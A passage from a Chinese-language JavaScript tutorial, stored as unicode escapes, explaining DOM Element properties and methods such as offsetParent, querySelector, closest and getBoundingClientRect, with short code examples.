\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u53ef\u8bfb\u5199\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u7684\u503c\uff0c\u4f1a\u5bfc\u81f4\u6d4f\u89c8\u5668\u5c06\u5f53\u524d\u5143\u7d20\u81ea\u52a8\u6eda\u52a8\u5230\u76f8\u5e94\u7684\u4f4d\u7f6e\u3002 Element.offsetParent \u00b6 Element.offsetParent \u5c5e\u6027\u8fd4\u56de\u6700\u9760\u8fd1\u5f53\u524d\u5143\u7d20\u7684\u3001\u5e76\u4e14 CSS \u7684 position \u5c5e\u6027\u4e0d\u7b49\u4e8e static \u7684\u4e0a\u5c42\u5143\u7d20\u3002 1 2 3 4 5 < div style = \"position: absolute;\" > < p > < span > Hello </ span > </ p > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c span \u5143\u7d20\u7684 offsetParent \u5c5e\u6027\u5c31\u662f div \u5143\u7d20\u3002 \u8be5\u5c5e\u6027\u4e3b\u8981\u7528\u4e8e\u786e\u5b9a\u5b50\u5143\u7d20\u4f4d\u7f6e\u504f\u79fb\u7684\u8ba1\u7b97\u57fa\u51c6\uff0c Element.offsetTop \u548c Element.offsetLeft \u5c31\u662f offsetParent \u5143\u7d20\u8ba1\u7b97\u7684\u3002 \u5982\u679c\u8be5\u5143\u7d20\u662f\u4e0d\u53ef\u89c1\u7684\uff08 display \u5c5e\u6027\u4e3a none \uff09\uff0c\u6216\u8005\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff08 position \u5c5e\u6027\u4e3a fixed \uff09\uff0c\u5219 offsetParent \u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 4 5 < div style = \"position: absolute;\" > < p > < span style = \"display: none;\" > Hello </ span > </ p > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c span \u5143\u7d20\u7684 offsetParent \u5c5e\u6027\u662f null \u3002 \u5982\u679c\u67d0\u4e2a\u5143\u7d20\u7684\u6240\u6709\u4e0a\u5c42\u8282\u70b9\u7684 position \u5c5e\u6027\u90fd\u662f static \uff0c\u5219 Element.offsetParent \u5c5e\u6027\u6307\u5411 <body> \u5143\u7d20\u3002 Element.offsetHeight\uff0cElement.offsetWidth \u00b6 Element.offsetHeight \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5143\u7d20\u7684 CSS \u5782\u76f4\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5305\u62ec\u5143\u7d20\u672c\u8eab\u7684\u9ad8\u5ea6\u3001padding \u548c border\uff0c\u4ee5\u53ca\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\uff08\u5982\u679c\u5b58\u5728\u6eda\u52a8\u6761\uff09\u3002 Element.offsetWidth \u5c5e\u6027\u8868\u793a\u5143\u7d20\u7684 CSS \u6c34\u5e73\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u90fd\u4e0e Element.offsetHeight \u4e00\u81f4\u3002 \u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\uff0c\u53ea\u6bd4 Element.clientHeight \u548c Element.clientWidth \u591a\u4e86\u8fb9\u6846\u7684\u9ad8\u5ea6\u6216\u5bbd\u5ea6\u3002\u5982\u679c\u5143\u7d20\u7684 CSS \u8bbe\u4e3a\u4e0d\u53ef\u89c1\uff08\u6bd4\u5982 display: none; \uff09\uff0c\u5219\u8fd4\u56de 0 \u3002 Element.offsetLeft\uff0cElement.offsetTop \u00b6 Element.offsetLeft \u8fd4\u56de\u5f53\u524d\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e Element.offsetParent \u8282\u70b9\u7684\u6c34\u5e73\u4f4d\u79fb\uff0c Element.offsetTop \u8fd4\u56de\u5782\u76f4\u4f4d\u79fb\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002\u901a\u5e38\uff0c\u8fd9\u4e24\u4e2a\u503c\u662f\u6307\u76f8\u5bf9\u4e8e\u7236\u8282\u70b9\u7684\u4f4d\u79fb\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u7b97\u51fa\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u6574\u5f20\u7f51\u9875\u7684\u5750\u6807\u3002 1 2 3 4 5 6 7 8 9 10 function getElementPosition ( e ) { var x = 0 ; var y = 0 ; while ( e !== null ) { x += e . offsetLeft ; y += e . offsetTop ; e = e . offsetParent ; } return { x : x , y : y }; } Element.style \u00b6 \u6bcf\u4e2a\u5143\u7d20\u8282\u70b9\u90fd\u6709 style \u7528\u6765\u8bfb\u5199\u8be5\u5143\u7d20\u7684\u884c\u5185\u6837\u5f0f\u4fe1\u606f\uff0c\u5177\u4f53\u4ecb\u7ecd\u53c2\u89c1\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 Element.children\uff0cElement.childElementCount \u00b6 Element.children \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 HTMLCollection \u5b9e\u4f8b\uff09\uff0c\u5305\u62ec\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5b50\u5143\u7d20\u3002\u5982\u679c\u5f53\u524d\u5143\u7d20\u6ca1\u6709\u5b50\u5143\u7d20\uff0c\u5219\u8fd4\u56de\u7684\u5bf9\u8c61\u5305\u542b\u96f6\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 if ( para . children . length ) { var children = para . children ; for ( var i = 0 ; i < children . length ; i ++ ) { // ... } } \u4e0a\u9762\u4ee3\u7801\u904d\u5386\u4e86 para \u5143\u7d20\u7684\u6240\u6709\u5b50\u5143\u7d20\u3002 \u8fd9\u4e2a\u5c5e\u6027\u4e0e Node.childNodes \u5c5e\u6027\u7684\u533a\u522b\u662f\uff0c\u5b83\u53ea\u5305\u62ec\u5143\u7d20\u7c7b\u578b\u7684\u5b50\u8282\u70b9\uff0c\u4e0d\u5305\u62ec\u5176\u4ed6\u7c7b\u578b\u7684\u5b50\u8282\u70b9\u3002 Element.childElementCount \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u5305\u542b\u7684\u5b50\u5143\u7d20\u8282\u70b9\u7684\u4e2a\u6570\uff0c\u4e0e Element.children.length \u7684\u503c\u76f8\u540c\u3002 Element.firstElementChild\uff0cElement.lastElementChild \u00b6 Element.firstElementChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\uff0c Element.lastElementChild \u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u3002 \u5982\u679c\u6ca1\u6709\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de null \u3002 Element.nextElementSibling\uff0cElement.previousElementSibling \u00b6 Element.nextElementSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u540e\u4e00\u4e2a\u540c\u7ea7\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"div-01\">Here is div-01</div> // <div id=\"div-02\">Here is div-02</div> var el = document . getElementById ( 'div-01' ); el . nextElementSibling // <div id=\"div-02\">Here is div-02</div> Element.previousElementSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u524d\u4e00\u4e2a\u540c\u7ea7\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 \u5c5e\u6027\u76f8\u5173\u65b9\u6cd5 \u00b6 \u5143\u7d20\u8282\u70b9\u63d0\u4f9b\u516d\u4e2a\u65b9\u6cd5\uff0c\u7528\u6765\u64cd\u4f5c\u5c5e\u6027\u3002 getAttribute() \uff1a\u8bfb\u53d6\u67d0\u4e2a\u5c5e\u6027\u7684\u503c getAttributeNames() \uff1a\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684\u6240\u6709\u5c5e\u6027\u540d setAttribute() \uff1a\u5199\u5165\u5c5e\u6027\u503c hasAttribute() \uff1a\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u5b58\u5728 hasAttributes() \uff1a\u5f53\u524d\u5143\u7d20\u662f\u5426\u6709\u5c5e\u6027 removeAttribute() \uff1a\u5220\u9664\u5c5e\u6027 \u8fd9\u4e9b\u65b9\u6cd5\u7684\u4ecb\u7ecd\u8bf7\u770b\u300a\u5c5e\u6027\u7684\u64cd\u4f5c\u300b\u4e00\u7ae0\u3002 Element.querySelector() \u00b6 Element.querySelector \u65b9\u6cd5\u63a5\u53d7 CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u7236\u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5b50\u5143\u7d20\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u5339\u914d\u7684\u5b50\u5143\u7d20\uff0c\u5c31\u8fd4\u56de null \u3002 1 2 var content = document . getElementById ( 'content' ); var el = content . querySelector ( 'p' ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de content \u8282\u70b9\u7684\u7b2c\u4e00\u4e2a p \u5143\u7d20\u3002 Element.querySelector \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4efb\u4f55\u590d\u6742\u7684 CSS \u9009\u62e9\u5668\u3002 1 document . body . querySelector ( \"style[type='text/css'], style:not([type])\" ); \u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u65e0\u6cd5\u9009\u4e2d\u4f2a\u5143\u7d20\u3002 \u5b83\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u9009\u62e9\u5668\uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002 1 element . querySelector ( 'div, p' ) \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de element \u7684\u7b2c\u4e00\u4e2a div \u6216 p \u5b50\u5143\u7d20\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d4f\u89c8\u5668\u6267\u884c querySelector \u65b9\u6cd5\u65f6\uff0c\u662f\u5148\u5728\u5168\u5c40\u8303\u56f4\u5185\u641c\u7d22\u7ed9\u5b9a\u7684 CSS \u9009\u62e9\u5668\uff0c\u7136\u540e\u8fc7\u6ee4\u51fa\u54ea\u4e9b\u5c5e\u4e8e\u5f53\u524d\u5143\u7d20\u7684\u5b50\u5143\u7d20\u3002\u56e0\u6b64\uff0c\u4f1a\u6709\u4e00\u4e9b\u8fdd\u53cd\u76f4\u89c9\u7684\u7ed3\u679c\uff0c\u4e0b\u9762\u662f\u4e00\u6bb5 HTML \u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 < div > < blockquote id = \"outer\" > < p > Hello </ p > < div id = \"inner\" > < p > World </ p > </ div > </ blockquote > </ div > \u90a3\u4e48\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837\u67e5\u8be2\u7684\u8bdd\uff0c\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u662f\u7b2c\u4e00\u4e2a p \u5143\u7d20\uff0c\u800c\u4e0d\u662f\u7b2c\u4e8c\u4e2a\u3002 1 2 3 var outer = document . getElementById ( 'outer' ); outer . querySelector ( 'div p' ) // <p>Hello</p> Element.querySelectorAll() \u00b6 Element.querySelectorAll \u65b9\u6cd5\u63a5\u53d7 CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a NodeList \u5b9e\u4f8b\uff0c\u5305\u542b\u6240\u6709\u5339\u914d\u7684\u5b50\u5143\u7d20\u3002 1 2 var el = document . querySelector ( '#test' ); var matches = el . querySelectorAll ( 'div.highlighted > p' ); \u8be5\u65b9\u6cd5\u7684\u6267\u884c\u673a\u5236\u4e0e querySelector \u65b9\u6cd5\u76f8\u540c\uff0c\u4e5f\u662f\u5148\u5728\u5168\u5c40\u8303\u56f4\u5185\u67e5\u627e\uff0c\u518d\u8fc7\u6ee4\u51fa\u5f53\u524d\u5143\u7d20\u7684\u5b50\u5143\u7d20\u3002\u56e0\u6b64\uff0c\u9009\u62e9\u5668\u5b9e\u9645\u4e0a\u9488\u5bf9\u6574\u4e2a\u6587\u6863\u7684\u3002 \u5b83\u4e5f\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a CSS \u9009\u62e9\u5668\uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002\u5982\u679c\u9009\u62e9\u5668\u91cc\u9762\u6709\u4f2a\u5143\u7d20\u7684\u9009\u62e9\u5668\uff0c\u5219\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684 NodeList \u5b9e\u4f8b\u3002 Element.getElementsByClassName() \u00b6 Element.getElementsByClassName \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5177\u6709\u6307\u5b9a class \u7684\u5b50\u5143\u7d20\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u4e0e document.getElementsByClassName \u65b9\u6cd5\u7684\u7528\u6cd5\u7c7b\u4f3c\uff0c\u53ea\u662f\u641c\u7d22\u8303\u56f4\u4e0d\u662f\u6574\u4e2a\u6587\u6863\uff0c\u800c\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u3002 1 element . getElementsByClassName ( 'red test' ); \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u5927\u5c0f\u5199\u654f\u611f\u3002 \u7531\u4e8e HTMLCollection \u5b9e\u4f8b\u662f\u4e00\u4e2a\u6d3b\u7684\u96c6\u5408\uff0c document \u5bf9\u8c61\u7684\u4efb\u4f55\u53d8\u5316\u4f1a\u7acb\u523b\u53cd\u5e94\u5230\u5b9e\u4f8b\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u751f\u6548\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"example\"> // <p class=\"foo\"></p> // <p class=\"foo\"></p> // </div> var element = document . getElementById ( 'example' ); var matches = element . getElementsByClassName ( 'foo' ); for ( var i = 0 ; i < matches . length ; i ++ ) { matches [ i ]. classList . remove ( 'foo' ); matches . item ( i ). classList . add ( 'bar' ); } // \u6267\u884c\u540e\uff0cHTML \u4ee3\u7801\u5982\u4e0b // <div id=\"example\"> // <p></p> // <p class=\"foo bar\"></p> // </div> \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c matches \u96c6\u5408\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\uff0c\u4e00\u65e6\u88ab\u62ff\u6389 class \u91cc\u9762\u7684 foo \uff0c\u5c31\u4f1a\u7acb\u523b\u4ece matches \u91cc\u9762\u6d88\u5931\uff0c\u5bfc\u81f4\u51fa\u73b0\u4e0a\u9762\u7684\u7ed3\u679c\u3002 Element.getElementsByTagName() \u00b6 Element.getElementsByTagName() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5339\u914d\u6307\u5b9a\u6807\u7b7e\u540d\u7684\u5b50\u5143\u7d20\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u4e0e document.getElementsByClassName() \u65b9\u6cd5\u7684\u7528\u6cd5\u7c7b\u4f3c\uff0c\u53ea\u662f\u641c\u7d22\u8303\u56f4\u4e0d\u662f\u6574\u4e2a\u6587\u6863\uff0c\u800c\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u3002 1 2 var table = document . getElementById ( 'forecast-table' ); var cells = table . getElementsByTagName ( 'td' ); \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u7684\uff0c\u56e0\u4e3a HTML \u6807\u7b7e\u540d\u4e5f\u662f\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u3002 Element.closest() \u00b6 Element.closest \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u5339\u914d\u8be5\u9009\u62e9\u5668\u7684\u3001\u6700\u63a5\u8fd1\u5f53\u524d\u8282\u70b9\u7684\u4e00\u4e2a\u7956\u5148\u8282\u70b9\uff08\u5305\u62ec\u5f53\u524d\u8282\u70b9\u672c\u8eab\uff09\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u8282\u70b9\u5339\u914d CSS \u9009\u62e9\u5668\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // HTML \u4ee3\u7801\u5982\u4e0b // <article> // <div id=\"div-01\">Here is div-01 // <div id=\"div-02\">Here is div-02 // <div id=\"div-03\">Here is div-03</div> // </div> // </div> // </article> var div03 = document . getElementById ( 'div-03' ); // div-03 \u6700\u8fd1\u7684\u7956\u5148\u8282\u70b9 div03 . closest ( \"#div-02\" ) // div-02 div03 . closest ( \"div div\" ) // div-03 div03 . closest ( \"article > div\" ) //div-01 div03 . closest ( \":not(div)\" ) // article \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e closest \u65b9\u6cd5\u5c06\u5f53\u524d\u8282\u70b9\u4e5f\u8003\u8651\u5728\u5185\uff0c\u6240\u4ee5\u7b2c\u4e8c\u4e2a closest \u65b9\u6cd5\u8fd4\u56de div-03 \u3002 Element.matches() \u00b6 Element.matches \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u662f\u5426\u5339\u914d\u7ed9\u5b9a\u7684 CSS \u9009\u62e9\u5668\u3002 1 2 3 if ( el . matches ( '.someClass' )) { console . log ( 'Match!' ); } \u4e8b\u4ef6\u76f8\u5173\u65b9\u6cd5 \u00b6 \u4ee5\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u4e0e Element \u8282\u70b9\u7684\u4e8b\u4ef6\u76f8\u5173\u3002\u8fd9\u4e9b\u65b9\u6cd5\u90fd\u7ee7\u627f\u81ea EventTarget \u63a5\u53e3\uff0c\u8be6\u89c1\u76f8\u5173\u7ae0\u8282\u3002 Element.addEventListener() \uff1a\u6dfb\u52a0\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570 Element.removeEventListener() \uff1a\u79fb\u9664\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570 Element.dispatchEvent() \uff1a\u89e6\u53d1\u4e8b\u4ef6 1 2 3 4 5 element . addEventListener ( 'click' , listener , false ); element . removeEventListener ( 'click' , listener , false ); var event = new Event ( 'click' ); element . dispatchEvent ( event ); Element.scrollIntoView() \u00b6 Element.scrollIntoView \u65b9\u6cd5\u6eda\u52a8\u5f53\u524d\u5143\u7d20\uff0c\u8fdb\u5165\u6d4f\u89c8\u5668\u7684\u53ef\u89c1\u533a\u57df\uff0c\u7c7b\u4f3c\u4e8e\u8bbe\u7f6e window.location.hash \u7684\u6548\u679c\u3002 1 2 el . scrollIntoView (); // \u7b49\u540c\u4e8eel.scrollIntoView(true) el . scrollIntoView ( false ); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u4e3a true \uff0c\u8868\u793a\u5143\u7d20\u7684\u9876\u90e8\u4e0e\u5f53\u524d\u533a\u57df\u7684\u53ef\u89c1\u90e8\u5206\u7684\u9876\u90e8\u5bf9\u9f50\uff08\u524d\u63d0\u662f\u5f53\u524d\u533a\u57df\u53ef\u6eda\u52a8\uff09\uff1b\u5982\u679c\u4e3a false \uff0c\u8868\u793a\u5143\u7d20\u7684\u5e95\u90e8\u4e0e\u5f53\u524d\u533a\u57df\u7684\u53ef\u89c1\u90e8\u5206\u7684\u5c3e\u90e8\u5bf9\u9f50\uff08\u524d\u63d0\u662f\u5f53\u524d\u533a\u57df\u53ef\u6eda\u52a8\uff09\u3002\u5982\u679c\u6ca1\u6709\u63d0\u4f9b\u8be5\u53c2\u6570\uff0c\u9ed8\u8ba4\u4e3a true \u3002 Element.getBoundingClientRect() \u00b6 Element.getBoundingClientRect \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u63d0\u4f9b\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u5927\u5c0f\u3001\u4f4d\u7f6e\u7b49\u4fe1\u606f\uff0c\u57fa\u672c\u4e0a\u5c31\u662f CSS \u76d2\u72b6\u6a21\u578b\u7684\u6240\u6709\u4fe1\u606f\u3002 1 var rect = obj . getBoundingClientRect (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c getBoundingClientRect \u65b9\u6cd5\u8fd4\u56de\u7684 rect \u5bf9\u8c61\uff0c\u5177\u6709\u4ee5\u4e0b\u5c5e\u6027\uff08\u5168\u90e8\u4e3a\u53ea\u8bfb\uff09\u3002 x \uff1a\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u6a2a\u5750\u6807 y \uff1a\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u7eb5\u5750\u6807 height \uff1a\u5143\u7d20\u9ad8\u5ea6 width \uff1a\u5143\u7d20\u5bbd\u5ea6 left \uff1a\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u6a2a\u5750\u6807\uff0c\u4e0e x \u5c5e\u6027\u76f8\u7b49 right \uff1a\u5143\u7d20\u53f3\u8fb9\u754c\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u6a2a\u5750\u6807\uff08\u7b49\u4e8e x + width \uff09 top \uff1a\u5143\u7d20\u9876\u90e8\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u7eb5\u5750\u6807\uff0c\u4e0e y \u5c5e\u6027\u76f8\u7b49 bottom \uff1a\u5143\u7d20\u5e95\u90e8\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u7eb5\u5750\u6807\uff08\u7b49\u4e8e y + height \uff09 \u7531\u4e8e\u5143\u7d20\u76f8\u5bf9\u4e8e\u89c6\u53e3\uff08viewport\uff09\u7684\u4f4d\u7f6e\uff0c\u4f1a\u968f\u7740\u9875\u9762\u6eda\u52a8\u53d8\u5316\uff0c\u56e0\u6b64\u8868\u793a\u4f4d\u7f6e\u7684\u56db\u4e2a\u5c5e\u6027\u503c\uff0c\u90fd\u4e0d\u662f\u56fa\u5b9a\u4e0d\u53d8\u7684\u3002\u5982\u679c\u60f3\u5f97\u5230\u7edd\u5bf9\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u5c06 left \u5c5e\u6027\u52a0\u4e0a window.scrollX \uff0c top \u5c5e\u6027\u52a0\u4e0a window.scrollY \u3002 \u6ce8\u610f\uff0c getBoundingClientRect \u65b9\u6cd5\u7684\u6240\u6709\u5c5e\u6027\uff0c\u90fd\u628a\u8fb9\u6846\uff08 border \u5c5e\u6027\uff09\u7b97\u4f5c\u5143\u7d20\u7684\u4e00\u90e8\u5206\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u90fd\u662f\u4ece\u8fb9\u6846\u5916\u7f18\u7684\u5404\u4e2a\u70b9\u6765\u8ba1\u7b97\u3002\u56e0\u6b64\uff0c width \u548c height \u5305\u62ec\u4e86\u5143\u7d20\u672c\u8eab + padding + border \u3002 \u53e6\u5916\uff0c\u4e0a\u9762\u7684\u8fd9\u4e9b\u5c5e\u6027\uff0c\u90fd\u662f\u7ee7\u627f\u81ea\u539f\u578b\u7684\u5c5e\u6027\uff0c Object.keys \u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u6570\u7ec4\uff0c\u8fd9\u4e00\u70b9\u4e5f\u9700\u8981\u6ce8\u610f\u3002 1 2 var rect = document . body . getBoundingClientRect (); Object . keys ( rect ) // [] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c rect \u5bf9\u8c61\u6ca1\u6709\u81ea\u8eab\u5c5e\u6027\uff0c\u800c Object.keys \u65b9\u6cd5\u53ea\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u8fd4\u56de\u4e86\u4e00\u4e2a\u7a7a\u6570\u7ec4\u3002 Element.getClientRects() \u00b6 Element.getClientRects \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u91cc\u9762\u662f\u5f53\u524d\u5143\u7d20\u5728\u9875\u9762\u4e0a\u5f62\u6210\u7684\u6240\u6709\u77e9\u5f62\uff08\u6240\u4ee5\u65b9\u6cd5\u540d\u4e2d\u7684 Rect \u7528\u7684\u662f\u590d\u6570\uff09\u3002\u6bcf\u4e2a\u77e9\u5f62\u90fd\u6709 bottom \u3001 height \u3001 left \u3001 right \u3001 top \u548c width \u516d\u4e2a\u5c5e\u6027\uff0c\u8868\u793a\u5b83\u4eec\u76f8\u5bf9\u4e8e\u89c6\u53e3\u7684\u56db\u4e2a\u5750\u6807\uff0c\u4ee5\u53ca\u672c\u8eab\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\u3002 \u5bf9\u4e8e\u76d2\u72b6\u5143\u7d20\uff08\u6bd4\u5982 <div> \u548c <p> \uff09\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u4e2d\u53ea\u6709\u8be5\u5143\u7d20\u4e00\u4e2a\u6210\u5458\u3002\u5bf9\u4e8e\u884c\u5185\u5143\u7d20\uff08\u6bd4\u5982 <span> \u3001 <a> \u3001 <em> \uff09\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u6709\u591a\u5c11\u4e2a\u6210\u5458\uff0c\u53d6\u51b3\u4e8e\u8be5\u5143\u7d20\u5728\u9875\u9762\u4e0a\u5360\u636e\u591a\u5c11\u884c\u3002\u8fd9\u662f\u5b83\u548c Element.getBoundingClientRect() \u65b9\u6cd5\u7684\u4e3b\u8981\u533a\u522b\uff0c\u540e\u8005\u5bf9\u4e8e\u884c\u5185\u5143\u7d20\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u77e9\u5f62\u3002 1 < span id = \"inline\" > Hello World Hello World Hello World </ span > \u4e0a\u9762\u4ee3\u7801\u662f\u4e00\u4e2a\u884c\u5185\u5143\u7d20 <span> \uff0c\u5982\u679c\u5b83\u5728\u9875\u9762\u4e0a\u5360\u636e\u4e09\u884c\uff0c getClientRects \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u5c31\u6709\u4e09\u4e2a\u6210\u5458\uff0c\u5982\u679c\u5b83\u5728\u9875\u9762\u4e0a\u5360\u636e\u4e00\u884c\uff0c getClientRects \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u5c31\u53ea\u6709\u4e00\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 7 var el = document . getElementById ( 'inline' ); el . getClientRects (). length // 3 el . getClientRects ()[ 0 ]. left // 8 el . getClientRects ()[ 0 ]. right // 113.908203125 el . getClientRects ()[ 0 ]. bottom // 31.200000762939453 el . getClientRects ()[ 0 ]. height // 23.200000762939453 el . getClientRects ()[ 0 ]. width // 105.908203125 \u8fd9\u4e2a\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u5224\u65ad\u884c\u5185\u5143\u7d20\u662f\u5426\u6362\u884c\uff0c\u4ee5\u53ca\u884c\u5185\u5143\u7d20\u7684\u6bcf\u4e00\u884c\u7684\u4f4d\u7f6e\u504f\u79fb\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u884c\u5185\u5143\u7d20\u5305\u62ec\u6362\u884c\u7b26\uff0c\u90a3\u4e48\u8be5\u65b9\u6cd5\u4f1a\u628a\u6362\u884c\u7b26\u8003\u8651\u5728\u5185\u3002 1 2 3 4 5 < span id = \"inline\" > Hello World Hello World Hello World </ span > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <span> \u8282\u70b9\u5185\u90e8\u6709\u4e09\u4e2a\u6362\u884c\u7b26\uff0c\u5373\u4f7f HTML \u8bed\u8a00\u5ffd\u7565\u6362\u884c\u7b26\uff0c\u5c06\u5b83\u4eec\u663e\u793a\u4e3a\u4e00\u884c\uff0c getClientRects() \u65b9\u6cd5\u4f9d\u7136\u4f1a\u8fd4\u56de\u4e09\u4e2a\u6210\u5458\u3002\u5982\u679c\u884c\u5bbd\u8bbe\u7f6e\u5f97\u7279\u522b\u7a84\uff0c\u4e0a\u9762\u7684 <span> 